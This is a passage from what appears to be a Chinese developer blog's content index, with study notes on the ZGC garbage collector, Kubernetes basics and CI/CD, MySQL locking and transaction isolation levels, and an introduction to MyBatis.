<li><p><strong>并发重分配（Concurrent Relocate）</strong>：重分配是ZGC执行过程中的核心阶段，这个过程要把重分配集中的存活对象复制到新的Region上，并为重分配集中的每个Region维护一个<strong>转发表（Forwardding Table）</strong>，记录从旧对象到新对象的转向关系。</p>
<p>ZGC收集器能仅从引用上就明确得知一个对象是否处于重分配集之中，如果用户线程此时并发访问了位于重分配集中的对象，<strong>这次访问将会被预置的内存屏障(读屏障)所截获</strong>，然后立即根据Region上的转发表记录将访问转发到新复制的对象上，并同时修正更新该引用的值，使其直接指向新对象，ZGC将这种行为称为指针的<strong>自愈（Self-Healing）</strong>能力。</p>
</li>
</ul>
<blockquote>
<p>ZGC的颜色指针因为自愈（Self‐Healing）能力，所以只有第一次访问旧对象会变慢， 一旦重分配集中某个Region的存活对象都复制完毕后，这个Region就可以立即释放用于新对象的分配，但是转发表还得留着不能释放掉， 因为可能还有访问在使用这个转发表。</p>
</blockquote>
<ul>
<li><strong>并发重映射（Concurrent Remap）</strong>：重映射所做的就是修正整个堆中指向重分配集中旧对象的所有引用，但是ZGC中对象引用存在自愈功能，所以这个重映射操作并不是很迫切。ZGC很巧妙地把并发重映射阶段要做的工作，<strong>合并到了下一次垃圾收集循环中的并发标记阶段里去完成</strong>，反正它们都是要遍历所有对象的，这样合并就节省了一次遍历对象图的开销。一旦所有指针都被修正之后， 原来记录新旧对象关系的转发表就可以释放掉了。</li>
</ul>
<p>我在官网中选取了几张关键的ZGC垃圾收集流程图，帮助大家理解：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/08/qYZDlNfjhnkuWQd.png"
                      alt="Snipaste_2021-11-08_15-16-15.png"
                ></p>
<h1 id="ZGC存在的问题"><a href="#ZGC存在的问题" class="headerlink" title="ZGC存在的问题"></a>ZGC存在的问题</h1><p>ZGC最大的问题是<strong>浮动垃圾</strong>。ZGC的停顿时间是在10ms以下，但是ZGC的执行时间还是远远大于这个时间的。假如ZGC全过程需要执行10分钟，在这个期间由于对象分配速率很高，将创建大量的新对象，这些对象很难进入当次GC，所以只能在下次GC的时候进行回收，这些只能等到下次GC才能回收的对象就是浮动垃圾。</p>
<p>这也是ZGC没有<strong>分代</strong>所导致的问题，每次都需要进行全堆扫描，导致一些朝生夕死的对象没能及时的被回收。 那么如何解决？</p>
<p>目前唯一的办法是增大堆的容量，使得程序得到更多的喘息时间，但是这个也是一个治标不治本的方案。如果需要从根本上解决这个问题，还是需要引入分代收集，让新生对象都在一个专门的区域中创建，然后专门针对这个区域进行更频繁、更快的收集。</p>
<h1 id="ZGC参数设置"><a href="#ZGC参数设置" class="headerlink" title="ZGC参数设置"></a>ZGC参数设置</h1><p>启用ZGC比较简单，设置JVM参数<code>-XX:+UnlockExperimentalVMOptions</code>和<code>-XX:+UseZGC</code>即可。调优也并不难，因为ZGC调优参数并不多，远不像CMS那么复杂。它和G1一样，可以调优的参数都比较少，大部分工作JVM能很好的自动完成。下图所示是ZGC可以调优的参数：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/08/d2lhG3ko7OYv1bN.png"
                      alt="Snipaste_2021-11-08_15-40-35.png"
                ></p>
<h1 id="ZGC触发时机"><a href="#ZGC触发时机" class="headerlink" title="ZGC触发时机"></a>ZGC触发时机</h1><p>ZGC目前有4种机制触发GC：</p>
<ul>
<li>定时触发：默认为不使用，可通过<code>-XX:ZCollectionInterval</code>参数配置。</li>
<li>预热触发：最多三次，在堆内存达到10%、20%、30%时触发，主要用来统计GC时间，为其他GC机制使用。 当垃圾回收次数大于三次时，预热规则不再生效。</li>
<li>根据分配速率触发：基于正态分布统计，计算内存99.9%可能的最大分配速率，以及此速率下内存将要耗尽的时间点，在耗尽之前触发GC。</li>
<li>主动触发：通过参数<code>-XX:ZProactive</code>参数配置，默认开启。距上次GC堆内存增长10%，或距上次GC的时间超过5分钟时，对比<code>距上次GC的间隔时间 &gt; 49 * 一次GC的最大持续时间</code>，若大于则触发。</li>
</ul>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes</title>
    <url>/2021/11/12/2021/Kubernetes/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="云计算介绍"><a href="#云计算介绍" class="headerlink" title="云计算介绍"></a>云计算介绍</h1><p>云计算包含的内容十分繁杂，也有很多技术和公司牵强附会说自己是云计算公司，说自己是做云的，实际上可能风马牛不相及。说白了，云计算就是一种配置资源的方式，根据资源配置方式的不同我们可以把云计算从宏观上分为以下三种类型：</p>
<ul>
<li>IaaS：这是为了想要建立自己的商业模式并进行自定义的客户，例如亚马逊的EC2、S3存储、Rackspace虚拟机等都是IaaS。</li>
<li>PaaS：工具和服务的集合，对于想用它来构建自己的应用程序或者想快速得将应用程序部署到生产环境而不必关心底层硬件的用户和开发者来说是特别有用的，比如Cloud Foundry、Google App Engine、Heroku等。</li>
<li>SaaS：终端用户可以直接使用的应用程序。这个就太多，我们生活中用到的很多软件都是SaaS服务，只要基于互联网来提供的服务基本都是SaaS服务，有的服务是免费的，比如Google Docs，还有更多的是根据我们购买的Plan和使用量付费，比如GitHub、各种云存储。</li>
</ul>
<h2 id="云原生概念介绍"><a href="#云原生概念介绍" class="headerlink" title="云原生概念介绍"></a>云原生概念介绍</h2><p>下面是Cloud Native概念思维导图</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/17/zAi1cXw2NgE38kC.png"
                      alt="Snipaste_2021-11-17_20-14-01.png"
                ></p>
<p>云原生准确来说是一种文化，更是一种潮流，它是云计算的一个必然导向。它的意义在于让云成为云化战略成功的基石，而不是阻碍，如果业务应用上云之后开发和运维人员比原先还痛苦，成本还高的话，这样的云我们宁愿不上。</p>
<p>自从云的概念开始普及，许多公司都部署了实施云化的策略，纷纷搭建起云平台，希望完成传统应用到云端的迁移。但是这个过程中会遇到一些技术难题，上云以后，效率并没有变得更高，故障也没有迅速定位。</p>
<p>为了解决传统应用升级缓慢、架构臃肿、不能快速迭代、故障不能快速定位、问题无法快速解决等问题，云原生这一概念横空出世。云原生可以改进应用开发的效率，改变企业的组织结构，甚至会在文化层面上直接影响一个公司的决策。</p>
<p>另外，云原生也很好地解释了云上运行的应用应该具备什么样的架构特性——敏捷性、可扩展性、故障可恢复性。</p>
<p>从宏观概念上讲，云原生是不同思想的集合，集目前各种热门技术之大成，具体包括如下图所示的几个部分。</p>
<h2 id="Kubernetes与云原生的关系"><a href="#Kubernetes与云原生的关系" class="headerlink" title="Kubernetes与云原生的关系"></a>Kubernetes与云原生的关系</h2><p>Kuberentes可以说是乘着Docker和微服务的东风，一经推出便迅速蹿红，它的很多设计思想都契合了微服务和云原生应用的设计法则，这其中最著名的就是开发了<a class="link"   href="https://www.heroku.com/" >Heroku<i class="fas fa-external-link-alt"></i></a> PaaS平台的工程师们总结的 <a class="link"   href="https://12factor.net/" >Twelve-factor App<i class="fas fa-external-link-alt"></i></a>了。</p>
<h3 id="Kubernetes介绍"><a href="#Kubernetes介绍" class="headerlink" title="Kubernetes介绍"></a>Kubernetes介绍</h3><p><a class="link"   href="https://kubernetes.io/" >Kubernetes<i class="fas fa-external-link-alt"></i></a>是Google基于<a class="link"   href="https://research.google.com/pubs/pub43438.html" >Borg<i class="fas fa-external-link-alt"></i></a>开源的容器编排调度引擎，作为<a class="link"   href="https://cncf.io/" >CNCF<i class="fas fa-external-link-alt"></i></a>（Cloud Native Computing Foundation）最重要的组件之一，它的目标不仅仅是一个编排系统，而是提供一个规范，可以让你来描述集群的架构，定义服务的最终状态，Kubernetes可以帮你将系统自动得达到和维持在这个状态。</p>
<p>更直白的说，<strong>Kubernetes用户可以通过编写一个yaml或者json格式的配置文件，也可以通过工具&#x2F;代码</strong>生成或直接请求Kubernetes API创建应用，该配置文件中包含了用户想要应用程序保持的状态，不论整个Kubernetes集群中的个别主机发生什么问题，都不会影响应用程序的状态，你还可以通过改变该配置文件或请求Kubernetes API来改变应用程序的状态。</p>
<h3 id="服务发现与负载均衡"><a href="#服务发现与负载均衡" class="headerlink" title="服务发现与负载均衡"></a>服务发现与负载均衡</h3><p>Kubernetes在设计之初就充分考虑了针对容器的服务发现与负载均衡机制，提供了Service资源，并通过kube-proxy配合cloud provider来适应不同的应用场景。随着Kubernetes用户的激增，用户场景的不断丰富，又产生了一些新的负载均衡机制。目前，Kubernetes中的负载均衡大致可以分为以下几种机制，每种机制都有其特定的应用场景：</p>
<ul>
<li><strong>Service</strong>：直接用Service提供cluster内部的负载均衡，并借助cloud provider提供的LB提供外部访问</li>
<li><strong>Ingress</strong>：还是用Service提供cluster内部的负载均衡，但是通过自定义LB提供外部访问</li>
<li><strong>Service Load Balancer</strong>：把load balancer直接跑在容器中，实现Bare Metal的Service Load Balancer</li>
<li><strong>Custom Load Balancer</strong>：自定义负载均衡，并替代kube-proxy，一般在物理部署Kubernetes时使用，方便接入公司已有的外部服务</li>
</ul>
<p>详见<a class="link"   href="https://jimmysong.io/kubernetes-handbook/practice/service-discovery-and-loadbalancing.html" >Kubernetes Handbook - 服务发现与负载均衡<i class="fas fa-external-link-alt"></i></a>。</p>
<h3 id="持续集成与发布"><a href="#持续集成与发布" class="headerlink" title="持续集成与发布"></a>持续集成与发布</h3><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/17/qAW2zeQ3GuJFP7S.png"
                      alt="Snipaste_2021-11-17_20-43-37.png"
                ></p>
<p>使用Jenkins进行持续集成与发布流程图</p>
<p>应用构建和发布流程说明：</p>
<ol>
<li>用户向Gitlab提交代码，代码中必须包含<code>Dockerfile</code></li>
<li>将代码提交到远程仓库</li>
<li>用户在发布应用时需要填写git仓库地址和分支、服务类型、服务名称、资源数量、实例个数，确定后触发Jenkins自动构建</li>
<li>Jenkins的CI流水线自动编译代码并打包成Docker镜像推送到Harbor镜像仓库</li>
<li>Jenkins的CI流水线中包括了自定义脚本，根据我们已准备好的Kubernetes的YAML模板，将其中的变量替换成用户输入的选项</li>
<li>生成应用的Kubernetes YAML配置文件</li>
<li>更新Ingress的配置，根据新部署的应用的名称，在Ingress的配置文件中增加一条路由信息</li>
<li>更新PowerDNS，向其中插入一条DNS记录，IP地址是边缘节点的IP地址。关于边缘节点，请查看<a class="link"   href="https://jimmysong.io/kubernetes-handbook/practice/edge-node-configuration.html" >边缘节点配置<i class="fas fa-external-link-alt"></i></a></li>
<li>Jenkins调用Kubernetes的API，部署应用</li>
</ol>
<h3 id="日志收集与监控"><a href="#日志收集与监控" class="headerlink" title="日志收集与监控"></a>日志收集与监控</h3><p>基于现有的ELK日志收集方案，稍作改造，选用<a class="link"   href="https://www.elastic.co/products/beats/filebeat" >filebeat<i class="fas fa-external-link-alt"></i></a>来收集日志，可以作为sidecar的形式跟应用运行在同一个Pod中，比较轻量级消耗资源比较少。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/11/17/H1eXjAfzvcxb3Q8.png"
                      alt="filebeat-log-collector-arch.png"
                ></p>
<p>图 2.4.7：filebeat日志收集架构图</p>
<p>详见<a class="link"   href="https://jimmysong.io/kubernetes-handbook/practice/app-log-collection.html" >Kubernetes Handbook - 应用日志收集<i class="fas fa-external-link-alt"></i></a>。</p>
<h2 id="如何开发Kubernetes原生应用步骤介绍"><a href="#如何开发Kubernetes原生应用步骤介绍" class="headerlink" title="如何开发Kubernetes原生应用步骤介绍"></a>如何开发Kubernetes原生应用步骤介绍</h2><p>当我们有了一个kubernetes集群后，如何在上面开发和部署应用，应该遵循怎样的流程？</p>
<p>下面我将展示如何使用go语言开发和部署一个Kubernetes native应用，使用wercker进行持续集成与持续发布，我将以一个很简单的前后端访问，获取伪造数据并展示的例子来说明。</p>
<h3 id="云原生应用开发示例"><a href="#云原生应用开发示例" class="headerlink" title="云原生应用开发示例"></a>云原生应用开发示例</h3><p>我们将按照如下步骤来开发部署一个Kubernetes原生应用并将它部署到Kubernetes集群上开放给集群外访问：</p>
<ol>
<li>服务API的定义</li>
<li>使用Go语言开发Kubernetes原生应用</li>
<li>一个持续构建与发布工具与环境</li>
<li>使用traefik和VIP做边缘节点提供外部访问路由</li>
</ol>
<hr>
<h1 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最初源于谷歌内部的 Borg，提供了面向应用的容器集群部署和管理系统。Kubernetes 的目标旨在消除编排物理 &#x2F; 虚拟计算，网络和存储基础设施的负担，并使应用程序运营商和开发人员完全将重点放在以容器为中心的原语上进行自助运营。Kubernetes 也提供稳定、兼容的基础（平台），用于构建定制化的 workflows 和更高级的自动化任务。 Kubernetes 具备完善的集群管理能力，包括多层次的安全防护和准入机制、多租户应用支撑能力、透明的服务注册和服务发现机制、内建负载均衡器、故障发现和自我修复能力、服务滚动升级和在线扩容、可扩展的资源自动调度机制、多粒度的资源配额管理能力。Kubernetes 还提供完善的管理工具，涵盖开发、部署测试、运维监控等各个环节。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://s2.loli.net/2021/12/10/3GoQABpT64CM2Os.png"
                      alt="Snipaste_2021-12-10_17-59-47.png"
                ></p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h3><p>集群是一组节点，这些节点可以是物理服务器或者虚拟机，在他上面安装了Kubernetes环境。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://www.qikqiak.com/k8s-book/docs/images/k8s-cluster.png"
                      alt="k8s cluster"
                ></p>
<p><strong>Master 负责管理集群</strong>, master 协调集群中的所有活动，例如调度应用程序、维护应用程序的所需状态、扩展应用程序和滚动更新。 </p>
<p><strong>节点是 Kubernetes 集群中的工作机器，可以是物理机或虚拟机。</strong>每个工作节点都有一个 kubelet，它是管理节点并与 Kubernetes Master 节点进行通信的代理。节点上还应具有处理容器操作的容器运行时，例如 <a class="link"   href="https://www.docker.com/" >Docker<i class="fas fa-external-link-alt"></i></a> 或 <a class="link"   href="https://coreos.com/rkt/" >rkt<i class="fas fa-external-link-alt"></i></a>。一个 Kubernetes 工作集群至少有三个节点。 Master 管理集群，而节点用于托管正在运行的应用程序。</p>
<p>当您在 Kubernetes 上部署应用程序时，您可以告诉 master 启动应用程序容器。Master 调度容器在集群的节点上运行。 </p>
<p>节点使用 Master 公开的 Kubernetes API 与 Master 通信。用户也可以直接使用 Kubernetes 的 API 与集群交互。</p>
<h3 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h3><p>Pod 是一组紧密关联的容器集合，它们共享 PID、IPC、Network 和 UTS namespace，是Kubernetes 调度的基本单位。</p>
<p>Pod 的设计理念是支持多个容器在一个 Pod 中共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务。 <img  
                     lazyload
                     alt="image"
                     data-src="https://www.qikqiak.com/k8s-book/docs/images/k8s-pod.png"
                      alt="k8s pod"
                >在 Kubernetes 中，所有对象都使用 manifest（yaml或json）来定义，比如一个简单的 nginx 服务可以定义为 nginx.yaml，它包含一个镜像为 nginx 的容器：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span>  </span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span>  </span><br><span class="line">  <span class="attr">labels:</span>    </span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span>  </span><br><span class="line">  <span class="attr">containers:</span>  </span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span>    </span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span>    </span><br><span class="line">    <span class="attr">ports:</span>    </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<h3 id="Label"><a href="#Label" class="headerlink" title="Label"></a>Label</h3><p>Label 是识别 Kubernetes 对象的标签，以 key&#x2F;value 的方式附加到对象上（key最长不能超过63字节，value 可以为空，也可以是不超过253字节的字符串）。</p>
<p>Label 不提供唯一性，并且实际上经常是很多对象（如Pods）都使用相同的 label 来标志具体的应用。 Label 定义好后其他对象可以使用 Label Selector 来选择一组相同 label 的对象（比如Service 用 label 来选择一组 Pod）。Label Selector支持以下几种方式：</p>
<ul>
<li>等式，如app&#x3D;nginx和env!&#x3D;production</li>
<li>集合，如env in (production, qa)</li>
<li>多个label（它们之间是AND关系），如app&#x3D;nginx,env&#x3D;test</li>
</ul>
<h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><p>Namespace 是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组。常见的 pods, services,deployments 等都是属于某一个 namespace 的（默认是default），而 Node, PersistentVolumes 等则不属于任何 namespace。</p>
<h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><p>Deployment 确保任意时间都有指定数量的 <strong>Pod</strong>“副本”在运行。如果为某个 Pod 创建了Deployment 并且指定3个副本，它会创建3个 Pod，并且持续监控它们。如果某个 Pod 不响应，那么 Deployment 会替换它，保持总数为3.</p>
<p>如果之前不响应的 Pod 恢复了，现在就有4个 Pod 了，那么 Deployment 会将其中一个终止保持总数为3。如果在运行中将副本总数改为5，Deployment 会立刻启动2个新 Pod，保证总数为5。Deployment 还支持回滚和滚动升级。</p>
<p>当创建 Deployment 时，需要指定两个东西：</p>
<ul>
<li>Pod模板：用来创建 Pod 副本的模板</li>
<li>Label标签：Deployment 需要监控的 Pod 的标签。</li>
</ul>
<p><strong>现在已经创建了 Pod 的一些副本，那么在这些副本上如何均衡负载呢？我们需要的是 Service。</strong></p>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>Service 是应用服务的抽象，通过 labels 为应用提供负载均衡和服务发现。</p>
<p>匹配 labels 的Pod IP 和端口列表组成 endpoints，由 kube-proxy 负责将服务 IP 负载均衡到这些endpoints 上。</p>
<p>每个 Service 都会自动分配一个 cluster IP（仅在集群内部可访问的虚拟地址）和 DNS 名，其他容器可以通过该地址或 DNS 来访问服务，而不需要了解后端容器的运行。 <img  
                     lazyload
                     alt="image"
                     data-src="https://www.qikqiak.com/k8s-book/docs/images/k8s-service.png"
                      alt="k8s service"
                ></p>
<ul>
<li>Docker 的一些常用方法，当然我们的重点会在 Kubernetes 上面</li>
<li>会用 kubeadm 来搭建一套 Kubernetes 的集群</li>
<li>理解 Kubernetes 集群的运行原理</li>
<li>常用的一些控制器使用方法</li>
<li>还有 Kubernetes 的一些调度策略</li>
<li>Kubernetes的运维</li>
<li>包管理工具 Helm 的使用</li>
<li>最后我们会实现基于 Kubernetes 的 CI&#x2F;CD</li>
</ul>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql锁与事务</title>
    <url>/2021/04/05/2021/MySql%E9%94%81%E4%B8%8E%E4%BA%8B%E5%8A%A1/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="锁定义"><a href="#锁定义" class="headerlink" title="锁定义"></a>锁定义</h1><p>锁是计算机协调多个进程或线程并发访问某一资源的机制。 在数据库中，除了传统的计算资源（如CPU、RAM、I&#x2F;O等）的争用以外， 数据也是一种供需要用户共享的资源。如何保证数据并发访问的一致性、有效性 是所有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个 重要因素。</p>
<h2 id="锁分类"><a href="#锁分类" class="headerlink" title="锁分类"></a>锁分类</h2><ul>
<li>性能上分为乐观锁（使用版本对比控制实现）和悲观锁</li>
<li>数据库操作上分为读锁和写锁（悲观锁）</li>
<li>从对数据操作的粒度上分为表锁和行锁</li>
</ul>
<h1 id="表锁"><a href="#表锁" class="headerlink" title="表锁"></a>表锁</h1><p>每次操作锁住整张表。开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低；</p>
<p>手动增加表锁</p>
<p><code>lock table 表名称 read(write),表名称2 read(write)</code></p>
<p>查看表上加过的锁 </p>
<p><code>show open tables; </code></p>
<p>删除表锁 </p>
<p><code>unlock tables; </code></p>
<p>MyISAM在执行查询语句(SELECT)前,会自动给涉及的所有表加读锁,在执行增删改 操作前,会自动给涉及的表加写锁。 </p>
<p>1、对MyISAM表的读操作(加读锁) ,不会阻寒其他进程对同一表的读请求,但会阻 赛对同一表的写请求。只有当读锁释放后,才会执行其它进程的写操作。 </p>
<p>2、对MylSAM表的写操作(加写锁) ,会阻塞其他进程对同一表的读和写操作,只有 当写锁释放后,才会执行其它进程的读写操作 </p>
<p><strong>总结：</strong> </p>
<p>简而言之，就是<strong>读锁会阻塞写，但是不会阻塞读。而写锁则会把读和写都阻塞</strong>。</p>
<h1 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h1><p>InnoDB与MYISAM的最大不同有两点：</p>
<ul>
<li>支持事务</li>
<li>支持行级锁</li>
</ul>
<h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务是由一组SQL语句组成的逻辑处理单元,事务具有以下4个属性,通常简称为事务的ACID属性。 </p>
<p><strong>原子性(Atomicity)</strong> ：事务是一个原子操作单元,其对数据的修改,要么全都执行,要么全都不执行。 </p>
<p><strong>一致性(Consistent)</strong> ：在事务开始和完成时,数据都必须保持一致状态。这意味着所有相关的数据规则都必须应用于事务的修改,以保持数据的完整性;事务结束时,所有的内部数据结构(如B树索引或双向链表)也都必须是正确的。 </p>
<p><strong>隔离性(Isolation)</strong> ：数据库系统提供一定的隔离机制,保证事务在不受外部并发操作影响的“独立”环境执行。这意味着事务处理过程中的中间状态对外部是不可见的,反之亦然。 </p>
<p><strong>持久性(Durable)</strong> ：事务完成之后,它对于数据的修改是永久性的,即使出现系统故障也能够保持</p>
<h3 id="带来的问题"><a href="#带来的问题" class="headerlink" title="带来的问题"></a>带来的问题</h3><p><strong>更新丢失（Lost Update）</strong> </p>
<p>当两个或多个事务选择同一行，然后基于最初选定的值更新该行时，由于每个事务都不知道其他事务的存在，就会发生丢失更新问题–最后的更新覆盖了由其他事务所做的更新。 </p>
<p><strong>脏读（Dirty Reads）</strong> </p>
<p>一个事务正在对一条记录做修改，在这个事务完成并提交前，这条记录的数据就处于不一致的状态；这时，另一个事务也来读取同一条记录，如果不加控制，第二个事务读取了这些“脏”数据，并据此作进一步的处理，就会产生未提交的数据依赖关系。这种现象被形象的叫做“脏读”。 </p>
<p>一句话：事务A读取到了事务B已经修改但尚未提交的数据，还在这个数据基础上做了操作。此时，如果B事务回滚，A读取的数据无效，不符合一致性要求。 </p>
<p><strong>不可重读（Non-Repeatable Reads）</strong></p>
<p>一个事务在读取某些数据后的某个时间，再次读取以前读过的数据，却发现其读出的数据已经发生了改变、或某些记录已经被删除了！这种现象就叫做“不可重复读”。 </p>
<p>一句话：事务A读取到了事务B已经提交的修改数据，不符合隔离性 </p>
<p><strong>幻读（Phantom Reads）</strong> </p>
<p>一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据，这种现象就称为“幻读”。 </p>
<p>一句话：事务A读取到了事务B提交的新增数据，不符合隔离性 </p>
<h3 id="对应的隔离级别"><a href="#对应的隔离级别" class="headerlink" title="对应的隔离级别"></a>对应的隔离级别</h3><table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>读未提交</td>
<td>可能</td>
<td>可能</td>
<td>可能</td>
</tr>
<tr>
<td>读提交</td>
<td>不可能</td>
<td>可能</td>
<td>可能</td>
</tr>
<tr>
<td>可重复读</td>
<td>不可能</td>
<td>不可能</td>
<td>可能</td>
</tr>
<tr>
<td>可串行化</td>
<td>不可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
</tbody></table>
<p><strong>设置事务隔离级别：set tx_isolation&#x3D;’REPEATABLE-READ’;</strong> </p>
<p><strong>常看当前数据库的事务隔离级别: show variables like ‘tx_isolation’;</strong> </p>
<h2 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h2><p>关于锁机制，当innodb在事务处理中，A事务对某条数据操作时会加锁，【写锁或者读锁】</p>
<p>之后B事务对该数据进行操作的时候，更具读写锁机制和加锁机制进行操作。</p>
<p>这么说，同时只有一个事务对数据进行修改</p>
<h1 id="MVCC-便于理解型"><a href="#MVCC-便于理解型" class="headerlink" title="MVCC-便于理解型"></a>MVCC-便于理解型</h1><p>首先是注意到基于版本号的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id name balance 创建事务id 删除事务id 2</span><br><span class="line">1 lilei  450      10       13  </span><br><span class="line">2 hanmei 16000    11       空  </span><br><span class="line">2 han666 16000    13       空</span><br></pre></td></tr></table></figure>

<p>这里面的10、11等都是版本号</p>
<p>1、当我们创建一条数据的时候，会把当前事务的id记录下来</p>
<p>2、当我们删除某条数据的时候，会记录下被删除行的当前事务id</p>
<p>3、当我们更新数据的时候，会在底层新增一行相同数据并记录下当前事务id</p>
<p>接下来是查询条件</p>
<p>执行查询操作mysql底层会带上过滤条件，<strong>创建事务id &lt;&#x3D; max(当前事务id(12)，快照点已提交最大事务id），删除事务id&gt; max(当前事务id(12)，快照点已提交最大事务id）</strong> </p>
<p>空是无敌</p>
<hr>
<p>上面是基本条件</p>
<p>之后我们可以尝试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/07/SXdvoaUsH8JykbW.jpg"
                      alt="Screenshot_24.jpg"
                ></p>
<hr>
<p>我感觉的对MVCC的理解还是不是很好，但是先这样</p>
<h1 id="优化建议"><a href="#优化建议" class="headerlink" title="优化建议"></a><strong>优化建议</strong></h1><p>尽可能让所有数据检索都通过索引来完成，避免无索引行锁升级为表锁 </p>
<p>合理设计索引，尽量缩小锁的范围 </p>
<p>尽可能减少检索条件范围，避免间隙锁 </p>
<p>尽量控制事务大小，减少锁定资源量和时间长度，涉及事务加锁的sql </p>
<p>尽量放在事务最后执行 </p>
<p>尽可能低级别事务隔离</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis</title>
    <url>/2021/03/19/2021/Mybatis/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/29/iEhm51kgG8FMYdz.jpg"
                      alt="Screenshot_10.jpg"
                ></p>
<h2 id="什么是-MyBatis？"><a href="#什么是-MyBatis？" class="headerlink" title="什么是 MyBatis？"></a>什么是 MyBatis？</h2><p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p>
<p>官方文档：<a class="link"   href="https://mybatis.org/mybatis-3/zh/index.html" >https://mybatis.org/mybatis-3/zh/index.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="传统JDBC和Mybatis相比的弊病"><a href="#传统JDBC和Mybatis相比的弊病" class="headerlink" title="传统JDBC和Mybatis相比的弊病"></a>传统JDBC和Mybatis相比的弊病</h2><p><strong>传统的JDBC的操作过程大致分为如下几步：</strong></p>
<ol>
<li>通过<code>Class.forName()</code>加载驱动</li>
<li>通过<code>DriverManager. getConnection()</code>创建连接</li>
<li>获取sql执行者<code>prepareStatement</code>并且通过其<code>execute</code>执行sql</li>
<li>通过sql执行者的<code>getResultSet</code>方法获取结果集<code>ResultSet</code>进行解析</li>
</ol>
<p><strong>传统JDBC的问题如下：</strong></p>
<ul>
<li>数据库连接创建、释放频繁造成资源浪费，从而影响系统性能，使用数据库连接池可以解决问题。</li>
<li>sql语句在java代码中硬编码，实际应用中sql的变化可能较大，造成代码维护不方便。</li>
<li>使用<code>preparedStatement</code>向有占位符传递参数存在硬编码问题，因为sql中的where子句的条件不确定，</li>
</ul>
<p>同样是修改不方便。</p>
<ul>
<li>对结果集中解析存在硬编码问题，sql的变化导致解析代码的变化，系统维护不方便。</li>
</ul>
<p><strong>mybatis对传统JDBC的解决方案</strong></p>
<ul>
<li>在mybatis配置文件<code>SqlMapConfig.xml</code>中配置数据连接池，使用连接池管理数据库链接。</li>
<li>将Sql语句配置在<strong>映射配置文件</strong>中与java代码分离。</li>
<li>Mybatis自动将java对象映射至sql语句，通过statement中的<code>parameterType</code>定义输入参数的类型。</li>
<li>Mybatis自动将sql执行结果映射至java对象，通过statement中的<code>resultType</code>定义输出结果的类型。</li>
</ul>
<h1 id="部分解析"><a href="#部分解析" class="headerlink" title="部分解析"></a>部分解析</h1><h2 id="从-XML-中构建-SqlSessionFactory"><a href="#从-XML-中构建-SqlSessionFactory" class="headerlink" title="从 XML 中构建 SqlSessionFactory"></a>从 XML 中构建 SqlSessionFactory</h2><p>每个基于 MyBatis 的应用都是以一个 <code>SqlSessionFactory </code>的实例为核心的。</p>
<p><code>SqlSessionFactory </code>的实例可以通过 <code>SqlSessionFactoryBuilder</code> 获得。</p>
<p>而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先配置的 Configuration 实例来构建出 SqlSessionFactory 实例。</p>
<p><strong>上面使用构造者模式获得工厂类</strong></p>
